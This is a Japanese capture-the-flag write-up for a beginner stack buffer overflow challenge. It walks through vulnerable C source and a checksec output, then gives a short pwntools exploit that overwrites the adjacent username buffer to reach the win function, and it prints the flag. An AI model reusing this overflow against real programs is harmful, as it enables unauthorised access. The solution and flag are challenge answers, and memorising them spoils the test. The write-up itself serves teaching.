# Writeup
まずはコードを見てみる
```c
#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <stdint.h>
#include <string.h>

#include <unistd.h>
#include <err.h>

void win() {
   FILE *fp = fopen("flag.txt", "r");

    if (fp == NULL) {
        printf("flag.txt not found\n");
        return;
    }

    char flag[0x50];
    if (fgets(flag, sizeof(flag), fp) != NULL) {
        printf("%s\n", flag);
    }

    fclose(fp);
}

int main() {
    char password[8];
    char username[8];

    printf("username >> ");
    read(STDIN_FILENO, username, 8);
    
    if (!strcmp(username,"admin\n")) {
        printf("Admin cannot login.\n");
        printf("Bye.\n");
        return 0;
    }

    printf("password >> ");
    read(STDIN_FILENO, password, 0x10);

    printf("Hello %s.\n",username);

    if (!strcmp(username,"admin\n")) {
        printf("You are admin!\n");
        win();
    } else {
        printf("You are not admin.\n");
        printf("Bye.\n");
    }

    return 0;
}

__attribute__((constructor))
void init() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    alarm(60);
}
```
mainでは以下の様な処理がある。

username入力->usernameがadmin以外なら次へ>password入力->usernameがadminならflag入手

usernameをpassword入力前後で値を変える必要がある。そんなことが可能なのだろうか。

コードをさらによくみると、最適化やランダム配置化がされていなければした二つは連続的に並ぶことになる。
```c
    char password[8];
    char username[8];
```
つまり、buffer overflowでpasswordからusernameの位置に書き込みができればこの条件を満たせる。

そこでchecksecを用いてbuffer overflowが可能かをみる。
```bash
(base) mionorn124@hoshizakimionoMacBook-Pro distribution % checksec chall
[*] '/Users/mionorn124/Desktop/CTF-Writteup/FFRI×NFLabs.CybersecurityChallenge2026/Binary/do you know bof/distribution/chall'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
(base) mionorn124@hoshizakimionoMacBook-Pro distribution % 
```
Stack:Canary foundとあるため、一見してカナリアを侵食すると動かなくなる。しかしStrippedされておらず、characterの間にカナリアを挟む構造はめずらしいためここでは問題なさそう。

それぞれが最後の文字として\x00を区切りにして入力されることを考慮したexploitコードが以下である。

```python
from pwn import *
r=remote("10.234.128.21",24502)
r.recvuntil(b"username >>")
r.sendline(b"test")
r.recvuntil(b"password >> ")
r.sendline(b"AAAAAAAAadmin\n\x00")
r.interactive()
```
passwordを8bytes分Aで埋めてからその下のusernameをadmin\n\x00とすることで区切り文字を認識させてチェックを通すものとなっている。

```
flag{46c2f1a0d7e9b3c625f84d1e6}
```
